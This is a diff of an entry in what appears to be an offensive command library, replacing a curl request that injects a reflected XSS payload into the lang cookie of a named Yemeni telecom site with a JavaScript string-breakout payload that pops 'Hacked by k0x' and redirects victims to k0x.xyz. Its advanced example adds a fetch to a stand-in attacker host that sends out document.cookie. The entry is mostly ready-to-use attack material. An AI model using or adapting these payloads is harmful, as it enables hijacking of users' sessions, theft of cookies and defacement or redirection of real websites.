@@ -1,23 +1,18 @@
 ---
-id: cmd-mtn-xss
+id: c1d2e3f4-h5i6-7890-defg-456789012345
 data: >-
-  curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" -H
-  "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696;
-  lang=ens4tgl%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ecyfn9;
-  _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1;
-  _gat_UA-44336198-10=1" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64;
-  rv:68.0) Gecko/20100101 Firefox/68.0"
+  video");alert('Hacked by
+  k0x');setTimeout(()=>location.href='https://k0x.xyz',5000);//
 tags:
   - xss
   - injection
 type: command
-output: null
-executor: bash
+output: Browser alert 'Hacked by k0x' and redirect after 5000ms
+executor: javascript
 platforms:
-  - Linux
   - Web
-created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:15:10.166Z'
+created_at: '2023-10-01T12:00:00Z'
+updated_at: '2025-12-14T17:27:49.589Z'
 verified: false
 validated: true
 submitted: true
@@ -26,33 +21,38 @@ submitted: true
 
 ## Command
 
-```bash
-curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" \
-  -H "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=ens4tgl%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ecyfn9; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1" \
-  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
+```javascript
+video");alert('Hacked by k0x');setTimeout(()=>location.href='https://k0x.xyz',5000);//
 ```
 
 ## Description
 
-Injects XSS payload into lang cookie for reflected script execution.
+This JavaScript payload is injected into a vulnerable web parameter to close a string context and execute malicious code, demonstrating XSS by alerting a message and redirecting the page.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `lang=..."><script>alert...</script>...` | URL-encoded breakout payload | Yes |
+| alert('Hacked by k0x') | Displays compromise message in browser | Yes |
+| setTimeout(()=>location.href='https://k0x.xyz',5000) | Redirects to attacker site after 5 seconds | Yes |
+| video"); ... // | String closure and comment to evade detection | Yes |
 
 ## Examples
 
 ### Basic Usage
 
-As above; execute in browser for alert.
+```javascript
+video");alert('Hacked by k0x');setTimeout(()=>location.href='https://k0x.xyz',5000);//
+```
+
+### Advanced Usage
+
+Adapt for different contexts, e.g., add data exfil: video");alert('Hacked');fetch('https://attacker.com/steal?cookie='+document.cookie);//
 
 ## Expected Output
 
-HTML with injected script; alert on load.
+An alert box appears with 'Hacked by k0x', followed by a 5-second delay and redirect to https://k0x.xyz. In a full exploit, this confirms code execution in the victim's browser.
 
 ## Related
 
-- [[commands/sqli-table-extraction]]
-- [[procedures/Exploit-Reflected-XSS-in-Lang-Cookie]]
+- [[Related Procedure: Create-Malicious-JavaScript-Payload-for-XSS]]
